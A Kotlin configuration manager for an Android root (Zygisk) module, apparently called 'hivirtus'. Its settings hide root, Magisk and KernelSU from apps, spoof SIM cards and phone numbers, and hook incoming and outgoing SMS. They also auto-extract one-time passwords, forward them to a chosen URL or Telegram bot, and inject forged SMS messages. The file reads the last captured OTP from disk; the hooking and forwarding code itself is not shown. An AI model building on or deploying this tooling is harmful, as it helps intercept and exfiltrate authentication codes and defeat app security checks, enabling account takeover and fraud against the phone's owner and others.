package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.io.File

data class ModuleConfig(
    val hideRoot: Boolean = true,
    val hideDeveloper: Boolean = true,
    val hideMagisk: Boolean = true,
    val hideKernelSu: Boolean = true,
    val hideApatch: Boolean = true,
    val hideSukisu: Boolean = true,
    val hideAllRootApps: Boolean = true,
    val enableSim1Mock: Boolean = false,
    val enableSim2Mock: Boolean = false,
    val enablePhoneSpoof: Boolean = false,
    val mockCountryIso: String = "in",
    val mockPhoneSim1: String = "+919876543210",
    val mockPhoneSim2: String = "+919876543211",
    val hookIncomingSms: Boolean = true,
    val hookOutgoingSms: Boolean = true,
    val autoExtractOtp: Boolean = true,
    val autoForwardToken: Boolean = true,
    val forwardUrl: String = "",
    val forwardMethod: String = "POST",
    val telegramBotToken: String = "",
    val telegramChatId: String = "",
    val injectSenderId: String = "AD-TEST-S",
    val injectMessageBody: String = ""
)

data class LastOtp(
    val otp: String,
    val sender: String,
    val direction: String = "incoming",
    val phone: String = ""
)

class ConfigManager(private val context: Context) {

    private val runtimeConfig = File(RUNTIME_CONFIG)
    private val moduleConfig = File(MODULE_CONFIG)
    private val injectCommand = File(INJECT_COMMAND)
    private val lastOtpFile = File(LAST_OTP_FILE)
    private val rootTypeFile = File(ROOT_TYPE_FILE)
    private val spoofPhoneFile = File(SPOOF_PHONE_FILE)

    fun load(): ModuleConfig {
        val file = when {
            runtimeConfig.exists() -> runtimeConfig
            moduleConfig.exists() -> moduleConfig
            else -> return ModuleConfig()
        }

        return try {
            val json = JSONObject(file.readText())
            ModuleConfig(
                hideRoot = json.optBoolean("hide_root", true),
                hideDeveloper = json.optBoolean("hide_developer", true),
                hideMagisk = json.optBoolean("hide_magisk", true),
                hideKernelSu = json.optBoolean("hide_kernelsu", true),
                hideApatch = json.optBoolean("hide_apatch", true),
                hideSukisu = json.optBoolean("hide_sukisu", true),
                hideAllRootApps = json.optBoolean("hide_all_root_apps", true),
                enableSim1Mock = json.optBoolean("enable_sim1_mock", false),
                enableSim2Mock = json.optBoolean("enable_sim2_mock", false),
                enablePhoneSpoof = json.optBoolean("enable_phone_spoof", false),
                mockCountryIso = json.optString("mock_country_iso", "in"),
                mockPhoneSim1 = json.optString("mock_phone_sim1", "+919876543210"),
                mockPhoneSim2 = json.optString("mock_phone_sim2", "+919876543211"),
                hookIncomingSms = json.optBoolean("hook_incoming_sms", true),
                hookOutgoingSms = json.optBoolean("hook_outgoing_sms", true),
                autoExtractOtp = json.optBoolean("auto_extract_otp", true),
                autoForwardToken = json.optBoolean("auto_forward_token", true),
                forwardUrl = json.optString("forward_url", ""),
                forwardMethod = json.optString("forward_method", "POST"),
                telegramBotToken = json.optString("telegram_bot_token", ""),
                telegramChatId = json.optString("telegram_chat_id", ""),
                injectSenderId = json.optString("inject_sender_id", "AD-TEST-S"),
                injectMessageBody = json.optString("inject_message_body", "")
            )
        } catch (_: Exception) {
            ModuleConfig()
        }
    }

    fun save(config: ModuleConfig) {
        val json = JSONObject().apply {
            put("hide_root", config.hideRoot)
            put("hide_developer", config.hideDeveloper)
            put("hide_magisk", config.hideMagisk)
            put("hide_kernelsu", config.hideKernelSu)
            put("hide_apatch", config.hideApatch)
            put("hide_sukisu", config.hideSukisu)
            put("hide_all_root_apps", config.hideAllRootApps)
            put("enable_sim1_mock", config.enableSim1Mock)
            put("enable_sim2_mock", config.enableSim2Mock)
            put("enable_phone_spoof", config.enablePhoneSpoof)
            put("mock_country_iso", config.mockCountryIso)
            put("mock_phone_sim1", config.mockPhoneSim1)
            put("mock_phone_sim2", config.mockPhoneSim2)
            put("hook_incoming_sms", config.hookIncomingSms)
            put("hook_outgoing_sms", config.hookOutgoingSms)
            put("auto_extract_otp", config.autoExtractOtp)
            put("auto_forward_token", config.autoForwardToken)
            put("forward_url", config.forwardUrl)
            put("forward_method", config.forwardMethod)
            put("telegram_bot_token", config.telegramBotToken)
            put("telegram_chat_id", config.telegramChatId)
            put("inject_sender_id", config.injectSenderId)
            put("inject_message_body", config.injectMessageBody)
            put("log_file", "/data/local/tmp/hivirtus_zygisk_mode.log")
        }

        runtimeConfig.parentFile?.mkdirs()
        runtimeConfig.writeText(json.toString(2))
        moduleConfig.parentFile?.mkdirs()
        try {
            moduleConfig.writeText(json.toString(2))
        } catch (_: Exception) {}
    }

    fun update(transform: (ModuleConfig) -> ModuleConfig) {
        save(transform(load()))
    }

    fun writeInjectCommand(sender: String, body: String) {
        injectCommand.parentFile?.mkdirs()
        injectCommand.writeText("INJECT|$sender|$body")
    }

    fun readRootType(): String {
        return try {
            rootTypeFile.readText().trim().ifBlank { "Unknown" }
        } catch (_: Exception) {
            "Unknown"
        }
    }

    fun readSpoofPhone(): String {
        return try {
            spoofPhoneFile.readText().trim()
        } catch (_: Exception) {
            load().mockPhoneSim1
        }
    }

    fun readLastOtp(): LastOtp? {
        if (!lastOtpFile.exists()) return null
        return try {
            val json = JSONObject(lastOtpFile.readText())
            LastOtp(
                otp = json.getString("otp"),
                sender = json.getString("sender"),
                direction = json.optString("direction", "incoming"),
                phone = json.optString("phone", readSpoofPhone())
            )
        } catch (_: Exception) {
            null
        }
    }

    companion object {
        private const val RUNTIME_CONFIG = "/data/local/tmp/hivirtus_zygisk_mode_config.json"
        private const val MODULE_CONFIG = "/data/adb/modules/hivirtus_zygisk_mode/config.json"
        private const val INJECT_COMMAND = "/data/local/tmp/hivirtus_inject.cmd"
        private const val LAST_OTP_FILE = "/data/local/tmp/hivirtus_last_otp.json"
        private const val ROOT_TYPE_FILE = "/data/local/tmp/hivirtus_root_type.txt"
        private const val SPOOF_PHONE_FILE = "/data/local/tmp/hivirtus_spoof_phone.txt"
    }
}
